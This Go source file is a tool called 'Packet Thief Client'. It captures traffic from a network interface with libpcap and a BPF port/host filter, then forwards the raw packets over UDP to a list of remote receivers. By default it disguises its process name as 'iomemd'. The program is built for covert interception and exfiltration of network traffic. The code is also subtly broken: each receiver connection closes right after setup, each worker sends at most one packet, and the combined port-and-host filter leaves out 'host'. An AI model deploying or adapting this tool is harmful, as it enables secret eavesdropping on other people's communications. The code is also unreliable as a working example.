package main

import (
	"flag"
	"fmt"
	"github.com/erikdubbelboer/gspt"
	"github.com/google/gopacket"
	"github.com/google/gopacket/pcap"
	"log"
	"net"
	"os"
	"strings"
)

const version string = "0.1"

var (
	device		= flag.String("i", "any", "Interface to get packets from")
	port		= flag.Int("p", 0, "Port to get packets from")
	proto		= flag.String("t", "udp", "Protocol to capture (udp|tcp)")
	target		= flag.String("a", "", "The host address to capture packets from")
	snaplen		= flag.Int("s", 65536, "SnapLen for packet capture")
	servers		= flag.String("r", "", "Comma separated list of receivers (ip:port)")
	name		= flag.String("n", "iomemd", "Set a custom process name")
	debug   	= flag.Bool("debug", false, "Debug mode")
	release     = flag.Bool("v", false, "Show version info")
)

var (
	err 		error
	handle 		*pcap.Handle
)

type receiver struct {
	address string
	channel chan []byte
}

func init() {
	flag.Usage = func() {
		fmt.Println("Usage: ptclient [ ... ]\n\nParameters:")
		flag.PrintDefaults()
	}
}

func main() {
	flag.Parse()

	if *release {
		printVersion()
		os.Exit(0)
	}

	if len(*servers) == 0 {
		fmt.Println("No receivers defined!")
		os.Exit(1)
	}

	setProcessName()

	receivers := getReceivers()

	for _, r := range receivers {
		go startReceiverWorker(r)
	}

	startServer(receivers)
}

func setProcessName() {
	gspt.SetProcTitle(*name)
}

func printVersion() {
	fmt.Println("Packet Thief Client")
	fmt.Printf("Version: %s\n", version)
}

func buildBPF() string {
	var filter string
	if *port == 0 && len(*target) == 0{
		fmt.Printf("Missing port or host filter")
		os.Exit(1)
	} else if *port == 0 && len(*target) > 0 {
		filter = fmt.Sprintf("%s and host %s", *proto, *target)
	} else if *port > 0 && len(*target) == 0 {
		filter = fmt.Sprintf("%s and port %d", *proto, *port)
	} else if *port > 0 && len(*target) > 0 {
		filter = fmt.Sprintf("%s and port %d and %s", *proto, *port, *target)
	} else {
		fmt.Println("Something happened. Check port and target variables")
		os.Exit(1)
	}

	return filter
}

func showInterfaces() {
	ifaces, err := net.Interfaces()
	if err != nil {
		fmt.Print(fmt.Errorf("localAddresses: %+v\n", err.Error()))
		return
	}
	for _, i := range ifaces {
		addrs, err := i.Addrs()
		if err != nil {
			fmt.Print(fmt.Errorf("localAddresses: %+v\n", err.Error()))
			continue
		}
		for _, a := range addrs {
			switch v := a.(type) {
			case *net.IPAddr:
				fmt.Printf("%v : %s (%s)\n", i.Name, v, v.IP.DefaultMask())

			case *net.IPNet:
				fmt.Printf("%v : %s [%v/%v]\n", i.Name, v, v.IP, v.Mask)
			}
		}
	}
}

func startServer(receivers []*receiver) {

	if *debug {
		log.Println("Starting capture")
	}

	// Open handle to interface
	handle, err = pcap.OpenLive(*device, int32(*snaplen), false, pcap.BlockForever)
	if err != nil {log.Fatal(err)}
	defer handle.Close()

	// Set Filter
	filter := buildBPF()
	err = handle.SetBPFFilter(filter)
	if err != nil {log.Fatal(err)}

	if *debug {
		log.Printf("Listening on %d. Waiting for packets", *port)
	}

	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
	for packet := range packetSource.Packets(){

		if *debug {
			log.Printf("Received packet...")
		}

		data := packet.Data()

		go func() {
			for _, r := range receivers {
				r.channel <- data
			}
		}()
	}
}

func getReceivers() []*receiver {
	receivers := make([]*receiver, 0)

	for _, x := range strings.Split(*servers, ",") {
		r := &receiver{address: strings.TrimSpace(x), channel: make(chan []byte)}
		receivers = append(receivers, r)
	}

	return receivers
}

func startReceiverWorker(r *receiver) {
	raddr, err := net.ResolveUDPAddr("udp", r.address)
	handle, err := net.DialUDP("udp", nil, raddr)
	if err != nil {log.Fatal(err)}
	defer handle.Close()

	if *debug {
		log.Printf("Adding receiver: %s\n", r.address)
	}

	doneChan := make(chan error, 1)

	go func() {

		d := <-r.channel
		_, err := handle.Write(d)
		if err != nil {
			if *debug {
				log.Printf("%s: %s", r.address, err)
			}
			doneChan <- err
		}

		if *debug {
			log.Printf("Packet sent to %s (%d)", r.address, len(d))
		}

		doneChan <- nil
	}()
}
